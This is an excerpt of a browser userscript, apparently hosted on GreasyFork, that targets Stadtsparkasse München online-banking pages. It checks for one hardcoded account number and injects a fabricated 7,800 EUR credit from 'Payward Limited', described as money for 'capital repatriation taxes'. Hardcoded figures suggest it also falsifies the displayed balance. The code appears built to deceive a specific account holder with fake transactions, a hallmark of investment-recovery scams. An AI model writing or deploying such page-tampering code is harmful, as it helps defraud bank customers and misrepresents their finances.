// ==UserScript==
// @name         Vertragssignature Kristof Regert
...
// @match        https://www.sskm.de/de/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.sskm.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.sskm.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/471775/Vertragssignature%20Kristof%20Regert.user.js
// @updateURL https://update.greasyfork.org/scripts/471775/Vertragssignature%20Kristof%20Regert.meta.js
// ==/UserScript==
...
(function() {
    ...
    var x2amount = 0;
    var buchung = 20000;
    var buchungDecimal = "92";
    var buchungTextsZahl = "186.413";
    var accountsecurity = "1007 6833 92";
       ...
       //}
        ...
        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){
          ...
          //    document.getElementsByClassName("saldo-linechart")[0].remove();
            ...
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 7.800,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld für Kapitalrückführung Steuern</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">7.800</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">7.800,00 EUR</span></div></div></div></div></li>';
